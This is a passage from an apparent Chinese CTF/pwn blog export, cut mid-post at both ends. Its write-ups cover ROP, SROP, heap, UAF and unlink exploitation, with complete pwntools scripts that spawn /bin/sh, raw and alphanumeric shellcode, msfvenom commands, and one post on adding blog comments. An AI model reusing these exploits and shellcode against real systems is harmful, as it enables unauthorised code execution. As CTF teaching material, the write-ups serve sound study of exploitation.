p32(r_info)fake_rel_addr = bss + 28fake_index = fake_rel_addr - rel_plt payload = p32(bss)payload+= p32(plt_0)payload+= p32(fake_index)payload+= p32(0xdeadbeef)payload+= p32(bss+0x80)payload+= p32(0)payload+= p32(0)payload+= fake_relpayload+= 'a'*alignpayload+= fake_syspayload+= 'system'payload = payload.ljust(0x80,'x00')payload+= '/bin/shx00'p.sendline(payload)p.interactive() 其它利用方式在.dynamic节中伪造.dynstr节地址 fake link_map 0x04参考资料i春秋：https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=44816&amp;highlight=linux%2Bpwn%2B%E5%85%A5%E9%97%A8ctfwiki：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#_5一位师傅的博客：http://pwn4.fun/2016/11/09/Return-to-dl-resolve/看雪:https://bbs.pediy.com/thread-227034.htm","tags":[]},{"title":"SROP利用分析","date":"2019-10-23T11:52:30.000Z","path":"year/10/23/cl6ewld9i001bj63fehvxabbu/","text":"0x00 概述传统的ROP技术，尤其是amd64上的ROP，需要寻找大量的gadgets以对寄存器进行赋值，执行特定操作，如果没有合适的gadgets就需要进行各种奇怪的组装。这一过程阻碍了ROP技术的使用。而SROP技术的提出大大简化了ROP攻击的流程。 SROP 应用场景与原理上方为用户层，下方为内核层。对于Linux来说 当一个用户层进程发起signal时，控制权切到内核层 内核保存进程的上下文(对我们来说重要的就是寄存器状态)到用户的栈上，然后再把rt_sigreturn地址压栈，跳到用户层执行Signal Handler，即调用rt_sigreturn rt_sigreturn执行完，跳到内核层 内核恢复②中保存的进程上下文，控制权交给用户层进程 有趣的是，这个过程存在着两个问题: rt_sigreturn在用户层调用，地址保存在栈上，执行后出栈 上下文也保存在栈上，比rt_sigreturn先进栈，且内核恢复上下文时不校验因此，我们完全可以自己在栈上放好上下文，然后自己调用re_sigreturn，跳过步骤1、2。 此时，我们将通过步骤3、4让内核把我们伪造的上下文恢复到用户进程中，也就是说我们可以重置所有寄存器的值，一次到位地做到控制通用寄存器，rip和完成栈劫持。这里的上下文我们称之为Sigreturn Frame。文章中同样给出了Sigreturn Frame的结构。0x01 利用方法利用条件我们在构造 ROP 攻击的时候，需要满足下面的条件 可以控制栈溢出的内容 需要知道相应的地址 /bin/sh字符串的地址 syscall的地址 SginalFrame的地址 需要有够大的空间来塞下整个 sigal frame 0x02 利用技巧 可以通过read等函数的返回值设置rax来调用syscall从而完成sigreturn的系统调用 通过劫持ebp来使栈上的数据地址可确定 pwntools的SignaFram工具 对于原生的i386来说，其SignalFrame的设置为 12context.arch = ‘i386’SROPFrame = SigreturnFrame(kernel = ‘i386’) 对于amd64上运行的32位程序来说，其SignalFrame的设置为 12context.arch=’i386’SROPFrame = SigreturnFrame(kernel = ‘amd64’) 0x03 示例分析程序很简单，只是一个栈溢出，只开了NX保护。但是看到程序没有后门函数甚至没有泄露函数，无法通过泄露libc来获得shell。并且找的gadget屈指可数。。。。 1ropper -f unexploitable 使用这个工具成功找到了一个syscall的gadget所以用SROP就比较合适了 exp123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *sh = process('./unexploitable')#gdb.attach(sh)context.arch = 'amd64'SROPFrame = SigreturnFrame()syscall_addr = 0x400560set_read_addr = 0x40055Bread_addr = 0x400571fake_stack_addr = 0x60116cfake_ebp_addr = 0x60116cbinsh_addr = 0x60115cpayload = ''payload += 'a'*0x10payload += p64(fake_stack_addr)payload += p64(set_read_addr)sh.send(payload)sleep(3)SROPFrame.rax = constants.SYS_execveSROPFrame.rdi = binsh_addrSROPFrame.rsi = 0SROPFrame.rdx = 0SROPFrame.rip = syscall_addrpayload = ''payload += '/bin/sh\\x00'payload += 'a'*8payload += p64(fake_stack_addr + 0x10)payload += p64(read_addr)payload += p64(fake_ebp_addr)payload += p64(syscall_addr)payload += str(SROPFrame)sh.send(payload)sleep(3)sh.send('/bin/sh\\x00'+('a')*7)sleep(1)sh.interactive()","tags":[]},{"title":"安恒杯2019-so_easy_pwn","date":"2019-10-20T16:23:51.000Z","path":"year/10/21/cl6ewldb90057j63fmcp8pkzb/","text":"通过修改栈上内容来影响下个函数栈上的状态，以此来劫持函数地址 0x01 PIE绕过PIE开启最后三位也是不变的，一般我们会修改它的后四位地址，然后爆破那一位达到函数调用的效果。 通过recv(timeout = 1)可以触发exccept 0x02 EXP123456789101112131415161718192021222324252627from pwn import *context.log_level = 'debug'i = 0shell = 'a9cd'while True: i += 1 print i sh = process('./pwn') #sh = remote('101.71.29.5',10000) sh.recvuntil(\"Welcome our the \") PIE_addr =hex(int(sh.recv(5))) payload = 'a'*12 +p32(int(PIE_addr + shell,16)) sh.recvuntil(\"So, Can you tell me your name?\") sh.send(payload) sh.recvuntil(\"Please input your choice:(1.hello|2.byebye):\") sleep(0.1) sh.sendline('\\x00') try: sh.recv(timeout = 1) sh.recv(timeout = 1) except Exception as e: print 'exception %s' % e sh.close() continue else: sleep(0.1) sh.interactive()","tags":[]},{"title":"极客巅峰第一道pwn","date":"2019-10-19T10:39:33.000Z","path":"year/10/19/cl6ewldba005bj63fysanb0um/","text":"0x0 解题思路首先发现uaf漏洞但是只能show和free一次，而且free掉的chunk只能被top_chunk合并。所以考虑利用溢出到top chunk修改top chunk的size然后再次malloc泄露出libc，利用fastbin attack劫持malloc_hook用onegadget获取shell 0x01 流程 溢出到top_chunk的size，修改其为一个较小的值 malloc一个大于刚才size的值，这时这个chunk会被添加到unsort_bin中,fd、bk指针被置为libc里的地址 再次malloc一个chunk 利用show泄露出libc的地址 uaf劫持malloc_hook 获取shell0x02 新学到的知识Unsorted Bin Attack初始状态时 unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。House Of Orange 概述House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。 原理如我们前面所述，House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。 进行chunk的分配时的顺序： fastbin small bins unsorted bins large bins top chunk 如果以上都不能满足申请的需求，则需要执行 sysmalloc 来向系统申请更多的空间。但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。 伪造的 top chunk size 的要求： 伪造的size必须对齐内存页 size 要大于 MINSIZE(0x10) size 要小于之后申请的 chunk size + MINSIZE(0x10) size 的 prev inuse 位必须为 1 malloc_hook劫持 何谓钩子函数，当一个函数挂载了钩子函数后，你执行这个函数时，实际执行的是钩子函数 通过泄露libc可以找到hook的地址 Fastbin Attack To stack必须满足fake chunk的size在fastbin的范围 0x03 脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768from pwn import *from LibcSearcher import LibcSearchercontext.log_level = 'debug'#sh = process('./pwn')sh = remote('55fca716.gamectf.com',37009)def add_note(size, content): sh.send('1') sleep(0.5) sh.sendafter('Size &gt; ',size) sh.sendafter('Content &gt;',content) sh.recvuntil('Your choice &gt; ')def show_note(): sh.send('2') data = u64(sh.recvuntil('Done!\\n')[8:16]) print hex(data) sh.recvuntil('Your choice &gt; ') return datadef delete_note(): sh.send('3') sh.recvuntil('Your choice &gt; ')def edit_note(size, content): sh.sendline('4') sleep(0.5) sh.recvuntil('Size &gt; ') sh.send(size) sh.recvuntil('Content &gt; ') sh.send(content) sh.recvuntil('Your choice &gt; ')gdb.attach(sh)fake_chunk_size = 0xfe1payload =''payload += 'a'*24payload += p64(fake_chunk_size)sh.sendlineafter(\"What's your name?\\n\", 'aaaa')sh.recvuntil('Your choice &gt; ')add_note('24', 'deadbeef')edit_note('32',payload)add_note('4096', 'deadbeef')add_note('96','deadbeef')addr = show_note()libcbase = addr - 1640 - 0x3c4b20one_gadget = libcbase + 0xf02a4malloc_hook_offset = 0x3C4B10malloc_hook_addr = libcbase + malloc_hook_offset-11-24log.info('malloc_addr: ' + hex(malloc_hook_addr))log.info('one_gadget_addr: '+ hex(one_gadget))delete_note()edit_note('8',p64(malloc_hook_addr))add_note('96','deadbeef')add_note('96','a'*19+p64(one_gadget))sh.sendline('1')sleep(0.2)sh.send('24')#pause()sh.interactive() 0x04 一些有待解决的迷惑问题recvuntil 和 sendline总是容易出问题","tags":[]},{"title":"shellcode编码","date":"2019-10-18T07:32:53.000Z","path":"year/10/18/cl6ewldap003zj63fcl2jngp4/","text":"字符检测绕过有时候程序会对输入进行一些可打印检查,导致平常的shellcode失效,这个时候需要对shellcode进行编码.可打印检查一般分为Alphanumeric(字符在[A-Za-z0-9]区间)和Printable(字符的ascii码在0x1f和0x7f区间,不包含边界). 例题:pwnable.tw:Death Note. x86编码x86下一个27字节的可用shellcode 1&quot;\\x42\\x4d\\x36\\x91\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\xcd\\x80&quot; x86下可以使用msf内置的encoder. 1234567msfvenom -a x86 --platform linux -p linux/x86/exec CMD=&quot;/bin/sh&quot; -e x86/alpha_upper BufferRegister=eax#可以直接生成shellcode,BufferRegister是指向shellcode的寄存器.#如果不声明BufferRegister,生成的shellcode会有额外的几条并不是可打印字符的指令来确定shellcode的位置.#x86/alpha_mixed这个encoder也可.x86/unicode_mixed与x86/unicode_upper用于宽字节的情况.cat shellcode | msfvenom -a x86 --platform linux -e x86/alpha_upper BufferRegister=eax#也可以用msf来编码已有的shellcode x64编码alpha3工具 一段可用的x64 shellcode1\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05 一段可用的x64 可见字符shellcode1Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M1L3a144H4p4l32354X4x3w8K2D3T3y1P0a0k3Q0f2O0g2I4H0p7m0A03 生成命令 1python ALPHA3.py x64 ascii mixedcase RAX --input=&quot;shellcode&quot; 手动编码123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *context.arch = \"amd64\"context.log_level = \"debug\"r = process(\"./chall3\")gdb.attach(r)payload = ''' push rax pop rdi push r15 pop rsi push r15 push r15 push r15 push r15 pop rsi pop rsi pop rsi pop rsi push 0x60 pop rdx sub byte ptr [rax + 0x2a], dl sub byte ptr [rax + 0x2a], dl sub byte ptr [rax + 0x2b], dl sub byte ptr [rax + 0x2d], dl sub byte ptr [rax + 0x2e], dl push r15 pop rdx push 0x3b pop rax'''#r15 = 0#rax = &amp;shellcodepayload = asm(payload)print hex(len(payload))payload += \"\\x48\\x43\\x27\\x2f\\x6f\\x65/bin/sh\"r.send(payload)r.interactive()","tags":[]},{"title":"入口函数和程序初始化","date":"2019-10-11T12:16:11.000Z","path":"year/10/11/cl6ewlday004nj63flyb3jr1x/","text":"0x01 入口函数的作用 操作系统在创建进程后，把控制权交到了程序的入口，这个入口往往是运行库中的某个入口函数。 入口函数对运行库和程序运行环境进行初始化，包括堆、I/O、线程、全局变量构造，等等。 入口函数在完成初始化之后，调用main函数，正式开始执行程序主体部分。 main 函数执行完毕以后，返回到入口函数，入口函数进行清理工作，包括全局变量析构、堆销毁、关闭I/O等，然后进行系统调用结束进程。 0x02 运行库与I/O什么是文件描述符 在操作系统层面上，文件操作也有类似于ELF的一个概念，在Linux里，这叫做文件描述符（File Descriptor），而在Windows里，叫做句柄（Handle） 内核可以通过句柄来计算出内核里文件对象的地址，但此能力并不对用户开放 在程序中打开文件得到的fd从3开始增长。fd具体指什么呢？在内核中，每一个进程都有一个私有的“打开文件表”，这个表是一个指针数组，每一个元素都指向一个内核打开的文件对象，而fd,就是这个表的下标。当用户打开一个文件时，内核会在内部生成一个打开文件对象，并在这个表里找到一个空项，让这一向指向生成的打开文件对象，并返回这一项的下表做fd。由于这个表处于内核，并且用户无法访问到，因此用户即使拥有fd，也无法得到打开文件对象的地址，指能够通过系统提供的函数来操作。I/O初始化的职责在用户空间建立stdin，stdout，stderr以及其对应的FILE结构，使得程序进入main之后可以直接使用 printf、scanf 等函数。 C语言运行库GLIBC 入口函数glibc 的程序入口为_start 12345678void _start()&#123; %ebp = 0; int argc = pop from stack cgar ** argv = top of stack __libc_start_main(main, argc, argv, __libc_csu_init, __libc_csu_fini, edx, top of stack);&#125;其中argv除了指向参数表外，还隐含紧接着环境变量表。这个环境变量表要在__libc_start_main 里从argv 内提取出来。 glibc运行库是平台相关的，因为它与操作系统结合的非常紧密。C语言的运行库从某种程度上来讲是C语言的程序和不同操作系统平台之间的抽象层，它将不同的操作系统API抽象成相同的库函数 glibc 的发布版本主要由两部分组成，一部分是头文件，比如stdio.h、stdlib.h等，它们往往位于/usr/include;另外一部分则是库的二进制文件部分 glibc 启动文件 “.init”和“.finit”.运行库会保证位于这两个段中的代码会先于/后于 main()函数执行。","tags":[]},{"title":"uaf漏洞入门","date":"2019-10-11T09:16:59.000Z","path":"year/10/11/cl6ewldas0045j63fyn44qjrx/","text":"0x01 原理uaf即use after free，也就是free后并没有将指针变量置为NULL，然后就可以再次使用那块内存。主要情况有： 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。 内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。 0x02 例子12345678910111213141516171819202122232425#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct name &#123; char *myname; void (*func)(char *str);&#125; NAME;void myprint(char *str) &#123; printf(\"%s\\n\", str); &#125;void printmyname() &#123; printf(\"call print my name\\n\"); &#125;int main() &#123; NAME *a; a = (NAME *)malloc(sizeof(struct name)); a-&gt;func = myprint; a-&gt;myname = \"I can also use it\"; a-&gt;func(\"this is my function\"); // free without modify free(a); a-&gt;func(\"I can also use it\"); // free with modify a-&gt;func = printmyname; a-&gt;func(\"this is my function\"); // set NULL a = NULL; printf(\"this pogram will crash...\\n\"); a-&gt;func(\"can not be printed...\");&#125; 运行结果如下 123456➜ use_after_free git:(use_after_free) ✗ ./use_after_free this is my functionI can also use itcall print my namethis pogram will crash...[1] 38738 segmentation fault (core dumped) ./use_after_free 0x03 例题根据题目我们可以看出程序最多添加5个note。每个note有两个字段，第一个是存储打印函数的地址，另一个是存储内内容的地址。 add_note这个函数是向node_list中添加一个note。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546unsigned int add_note()&#123; note *v0; // ebx signed int i; // [esp+Ch] [ebp-1Ch] int size; // [esp+10h] [ebp-18h] char buf; // [esp+14h] [ebp-14h] unsigned int v5; // [esp+1Ch] [ebp-Ch] v5 = __readgsdword(0x14u); if ( count &lt;= 5 ) &#123; for ( i = 0; i &lt;= 4; ++i ) &#123; if ( !notelist[i] ) &#123; notelist[i] = malloc(8u); if ( !notelist[i] ) &#123; puts(\"Alloca Error\"); exit(-1); &#125; notelist[i]-&gt;put = print_note_content; printf(\"Note size :\"); read(0, &amp;buf, 8u); size = atoi(&amp;buf); v0 = notelist[i]; v0-&gt;content = malloc(size); if ( !notelist[i]-&gt;content ) &#123; puts(\"Alloca Error\"); exit(-1); &#125; printf(\"Content :\"); read(0, notelist[i]-&gt;content, size); puts(\"Success !\"); ++count; return __readgsdword(0x14u) ^ v5; &#125; &#125; &#125; else &#123; puts(\"Full\"); &#125; return __readgsdword(0x14u) ^ v5;&#125; print_note用node字段的第一个位置存的print_node函数将第二位置存储的content打印出来。 12345678910111213141516171819unsigned int print_note()&#123; int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(\"Index :\"); read(0, &amp;buf, 4u); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;= count ) &#123; puts(\"Out of bound!\"); _exit(0); &#125; if ( notelist[v1] ) notelist[v1]-&gt;put(notelist[v1]); return __readgsdword(0x14u) ^ v3;&#125; delete_notedelete_note 会根据给定的索引释放note。但是只是单纯的进行了free，而并没有设置为NULL，那么显然这里是存在uaf的。 1234567891011121314151617181920212223unsigned int del_note()&#123; int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(\"Index :\"); read(0, &amp;buf, 4u); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;= count ) &#123; puts(\"Out of bound!\"); _exit(0); &#125; if ( notelist[v1] ) &#123; free(notelist[v1]-&gt;content); free(notelist[v1]); puts(\"Success\"); &#125; return __readgsdword(0x14u) ^ v3;&#125; 0x03 利用分析很直接的思路，将note的put函数字段改为后门函数magic函数的地址，从而实现在执行 pirnt node 的时候执行 magic 函数。所以我们必须利用写content 的时候来进行覆盖。具体采用的思路如下。 申请 note0, real content size 为 32 （大小与note大小所在的bin不一样即可） 申请 note1, real content size 为 32 （大小与 note 大小所在的bin不一样即可） 释放 note0 释放 note1 此时，大小为16的 fast bin chunk 中链表为note1-&gt;note0 申请note2, 并设置real content的大小为8，那么根据堆的分配规则 note2 其实会分配 note1 对应的堆块。 real content 对应的chunk其实是note0。 如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用magic函数123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *r = process('./hacknote')def addnote(size, content): r.recvuntil(\":\") r.sendline(\"1\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(content)def delnote(idx): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(idx))def printnote(idx): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx))#gdb.attach(r)magic = 0x08048986addnote(32, \"aaaa\") # add note 0addnote(32, \"ddaa\") # add note 1delnote(0) # delete note 0delnote(1) # delete note 1addnote(8, p32(magic)) # add note 2printnote(0) # print note 0r.interactive() 0x04总结一下思路 劫持函数地址 利用堆分配的机制，也就是malloc优先分配刚刚free过的相同大小的chunk。利用这一点，将chunk0的内存分配给chunk3 的content 利用uaf向已经被free掉的内存中写入数据。 成功劫持函数。","tags":[]},{"title":"Asuri平台上简单pwn题的题解","date":"2019-10-04T01:42:29.000Z","path":"year/10/04/cl6ewld8d0003j63fp0raxwvp/","text":"pwn的话一开始确实入门比较困难，学习曲线陡峭是真的，不过只要耐心学习很快也可以入门的，大家加油！ 0x01 checkin题目放上来可能大家看到nc和后面一堆东西，一上来的反应也是懵的，这里解释一下： ncat 或者说 nc 是一款功能类似 cat 的工具，但是是用于网络的。它是一款拥有多种功能的 CLI 工具，可以用来在网络上读、写以及重定向数据 49.235.243.206代表一个服务器的ip地址，8001是这个服务器上的端口号 所以用nc 49.235.243.206 8001连接到那个服务器指定端口上的程序。 这道题由于是白给题，所以只要在虚拟机中执行，我们就可以拿到它服务器上的shell（相当于windows上的cmd）。后面的pwn题我们是需要分析它可以执行的这个应用程序，寻找漏洞来获得shell的。 拿到shell以后ls列出当前目录下文件，我们发现了一个flag文件，这正是我们想要的。所以再cat flag查看文件里的内容就可以了。 0x02 array分析题目这道题我们已经不能通过直接nc来获得shell了，但是我们有个这个程序的二进制文件，于是我们可以用ida打开这个文件可以看到左边有一个函数窗口，右边是汇编代码。一般我们为了快速分析程序的逻辑会首先在函数窗口中选main函数，然后按f5，结果如下：只要我们执行system(“/bin/sh”)我们就可以拿到shell现在思考我们怎样才能让程序执行这个函数，我们注意到： v7!=99的时候我们可以拿到shell，但是v7被初始化为了99，其它地方好像也没有改v7的操作。 注意到有一个read函数(虽然它叫read但它实际的作用是写)，第一个参数代表写入，第二个参数是要写入的地址，第三个参数代表写入多少个字节。这个函数的意思是，我们可以修改距离v5这个地址v4个字节地方的数据。 所以我们可以把v4设为v7和v5在内存之中的距离，这样我们就可以修改v7中的数据让其不等于99，成功拿到shell了。寻找偏移在ida中点击v5这个变量，发现他在-0x10这个位置（注意这是16进制）,再看v7在-0x1这个位置，他们之间的距离差了15。利用漏洞先输入15，将v4置为15，然后随便输入一个数字就可以把v7修改掉。0x03 easystack其实说栈溢出才是pwn真正的入门题目分析题目 只有一个read函数可以向buf中输入0x64个字节的数据 好像没有system(“/bin/sh”)函数？ 发现在函数窗口中有一个sub_4006CD其实是个system(“/bin/sh”)函数。 如何利用如何调用一个程序原本不会执行的函数，这涉及到一个概念叫做返回地址。比如main函数调用一个fun函数的话程序首先会把main函数中当前执行指令的位置保存在内存中的某一个地方，然后再跳转到fun函数中执行，当fun函数执行完毕以后程序就会跳回刚才保存的地址的位置。这个被保存的地址就叫做返回地址。我们可以通过修改main的返回地址，使得程序执行完main函数以后跳转到sub_4006CD这个函数去执行。想深入了解栈溢出的过程的话还是要看王爽的《汇编语言》或者南大袁春风的慕课计算机系统基础这里给一个参考资料，但是需要一定汇编基础。手把手教你栈溢出从入门到放弃 这个题能做出来的话，阶段性的招新赛和校赛基本上就可以做出几道pwn题了。 寻找buf与返回地址的偏移方法有很多种，这里介绍最简单的一种r就是那个返回地址,位置在+0x8的位置，buf在-0x10的位置，所以偏移是24 编写利用脚本exp12345678910from pwn import * #引入pwntools库sh = remote('49.235.243.206',8003) #创建与靶场服务器的连接offset = 24 #偏移sub_4006CD_addr = 0x4006CD #函数地址payload = offset*'a' + p64(sub_4006CD_addr) #构造攻击数据sh.sendline(payload) #向程序发送数据sh.interactive() #将控制流从程序转移到自己这里 然后执行脚本python exp.py利用成功！ 0x04 easyrop具体参考资料题目上写的很清楚，这里就给个利用脚本，大家可以看下自己哪里错了，动态调试一下。 123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *from LibcSearcher import LibcSearcher#sh = process('./pwn')sh = remote('49.235.243.206',8004)elf = ELF('./pwn')write_plt = 0x400530 #write的got表地址write_got = elf.got['write'] #write的plt表地址 main_addr = 0x400580 pop_rdi = 0x400773 #pop_rdi_retpop_rsi_r15 = 0x400771 #pop_rsi_r15_retpayload =''payload += 'a'*24#设置rdi为1payload += p64(pop_rdi)payload += p64(1)#设置rsi为write的got表地址payload += p64(pop_rsi_r15)payload += p64(write_got)payload += p64(0xdeadbeef)#rdx可以不用设，因为上一个read函数已经设好了，只要大于8就行#调用write函数，返回到main函数payload += p64(write_plt)payload += p64(main_addr)sh.recvuntil('easy_rop')sh.sendline(payload)write_addr = u64(sh.recvuntil('easy_rop')[0:8])#libc装载到内存时是整体装载的，所以libc函数之间的偏移是不变得#但是不同版本的libc函数之间的偏移是不一样的，所以我们需要泄露一个libc函数地址来确定libc版本libc = LibcSearcher('write',write_addr)libcbase = write_addr - libc.dump('write')system_addr = libcbase + libc.dump('system')binsh_addr = libcbase + libc.dump('str_bin_sh')#调用system('/bin/sh')payload =''payload += 24*'a'payload += p64(pop_rdi)payload += p64(binsh_addr)payload += p64(system_addr)sh.sendline(payload)sh.interactive()","tags":[]},{"title":"给博客添加评论功能","date":"2019-10-03T14:46:50.000Z","path":"year/10/03/cl6ewldbi005tj63f6bu3jfyw/","text":"今天突发奇想想给博客添加一个评论功能，其实以前就有这个想法，但是我记得注册一个第三方平台账户的时候要求我拍什么身份证照片，直接就放弃了。后来看到一个gitment，就是一个用github账号登陆的评论系统，试了一试也失败了，今天重新弄费了九牛二虎之力终于搞好了，写篇博客记录下。 安装gitment安装模块在你的博客根目录安装 1npm i --save gitment 申请应用首先去New OAuth App为你的博客申请一个密钥。申请好之后点注册,然后就可以看到两个东西ClientID和Client Secret,后面会用到. 配置下面就是配置Gitment,主要编辑在themes/next/_config.yml: 123456789101112131415# Gitment# Introduction: https://imsun.net/posts/gitment-introduction/gitment: enable: true mint: true # RECOMMEND, A mint on Gitment, to support count, language and proxy_gateway count: true # Show comments count in post meta area lazy: false # Comments lazy loading with a button cleanly: false # Hide 'Powered by ...' on footer, and more language: # Force language, or auto switch by theme github_user: &#123;you github user id&#125; github_repo: 随便写一个你的公开的git仓库就行,到时候评论会作为那个项目的issue client_id: &#123;刚才申请的ClientID&#125; client_secret: &#123;刚才申请的Client Secret&#125; proxy_gateway: # Address of api proxy, See: https://github.com/aimingoo/intersect redirect_protocol: # Protocol of redirect_uri with force_redirect_protocol when mint enabled 开通评论到这里原则上就ok了，只要在每篇博客下登陆并初始化就行了，如果你运气好的话。。。。。但是因为这个东西的插件好像没人维护所以会出各种问题，在下面我总结一下会出现的问题。 问题Error: Validation Failedissue的Label有长度限制,对于中文博客来说,中文标题很容易就超过长度限制,所以需要做一下特殊处理,修改blog/_config.yml把permalink: :year/:month/:day/:title/ 改成:year/:month/:day/:id/ 可以解决这个问题. Error: [Object ProgressEvent]出现这个问题是由于作者在gitment.browser.js中硬编码了自己的服务器人证域名:https://gh-oauth.imsun.net，现在域名过期了,要么自己搭一个认证服务器，要么可以用其他人的，在gitment的issues里面找到了答案:#175,需要把Hexo你所用的主题中的引用文件给改一下，我用的是next主题,改动方法如下:修改blog/themes/next/layout/_third-party/comments/gitment.swig，找到下面这部分代码 12&lt;link rel=\"stylesheet\" href=\"https://imsun.github.io/gitment/style/default.css\"&gt;&lt;script src=\"https://imsun.github.io/gitment/dist/gitment.browser.js\"&gt;&lt;/script&gt; 改为： 12&lt;link rel=\"stylesheet\" href=\"https://billts.site/extra_css/gitment.css\"&gt;&lt;script src=\"https://billts.site/js/gitment.js\"&gt;&lt;/script&gt; Error: Not Found问题owner或者repo配置错误了，注意名字和仓库名字的大小写。 其它问题多尝试 hexo clean 后再试试，有可能是缓存没清楚的问题。退出github再登陆，有的时候也可以解决问题。","tags":[]},{"title":"unlink入门题","date":"2019-09-19T17:44:51.000Z","path":"year/09/20/cl6ewldat0048j63fh4vgza9j/","text":"刚学了unlink,总结下利用方式和思路 0x0 unlink漏洞分析概览free函数在释放堆块时,会判断相邻前,后堆块是否为空闲堆块,是就会进行合并,然后利用unlink机制将该空闲堆块从unsorted bin中取下. 源码细节触发条件 1234567891011121314151617181920212223if (!prev_inuse(p)) &#123;/* 如果当前free的chunk的前一个相邻chunk为空闲状态,与前一个空闲chunk合并 */ prevsize = p-&gt;prev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd);&#125;if (nextchunk != av-&gt;top) &#123;/* 与当前free的chunk相邻的下一个chunk不是分配区的top chunk */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize); if (!nextinuse) &#123; /* 如果当前free的chunk的下一个相邻chunk为空闲状态,与下一个空闲chunk合并 */ unlink(av, nextchunk, bck, fwd); size += nextsize; &#125; else /* code */ /* code */&#125; else &#123; /* code */&#125; 可以让一个构造出来的fake chunk被unlink导致一次固定地址写. 123456789101112131415161718192021222324252627#define unlink(AV, P, BK, FD) &#123; FD = P-&gt;fd; BK = P-&gt;bk; if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); else &#123; FD-&gt;bk = BK; BK-&gt;fd = FD; if (!in_smallbin_range (P-&gt;size) &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) malloc_printerr (check_action, \"corrupted double-linked list (not small)\", P, AV); if (FD-&gt;fd_nextsize == NULL) &#123; if (P-&gt;fd_nextsize == P) FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; else &#123; FD-&gt;fd_nextsize = P-&gt;fd_nextsize; FD-&gt;bk_nextsize = P-&gt;bk_nextsize; P-&gt;fd_nextsize-&gt;bk_nextsize = FD; P-&gt;bk_nextsize-&gt;fd_nextsize = FD; &#125; &#125; else &#123; P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; &#125; &#125; &#125; &#125; 这里需要绕过检测__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0),使P-&gt;fd-&gt;bk == P &amp;&amp; P-&gt;bk-&gt;fd == P为真.所以fake chunk可以如下构造. 1fake_pre_size | fake_size | &amp;target - 0x18 | &amp;target - 0x10 0x1分析程序通过反汇编可知，程序是一个笔记本程序，可以对笔记本进行增加，删除，修改操作。我首先考虑栈溢出的情况，但是没有找到可以溢出的位置。然后又寻找uaf和double free漏洞是否存在，发现所有位置在free后都置为了0，也没有这个漏洞。最后发现它在修改操作上出现了一些问题。它进行的修改操作： 输入要修改note的索引 检测该索引是否有note存在，若无则退出程序 输入要修改后内容的最大字节数 输入内容可以想到如果我们输入的修改后的最大字节数比一开始malloc的空间大的话，我们就可以在输入时覆盖掉当前这个note后面的chunk的内容。我们就可以用unlink的方式实现任意地址写 0x2利用方式写好增加，删除，修改的函数，避免写一些重复。 12345678910111213141516171819202122232425def add_note(size, stri): sh.recvuntil(\"Your choice : \") sh.sendline(\"1\") sh.recvuntil(\"Size of note : \") sh.sendline(str(size)) sh.recvuntil(\"Content of note:\") sh.sendline(stri) sh.recvuntil(\"Success!\\n\")def 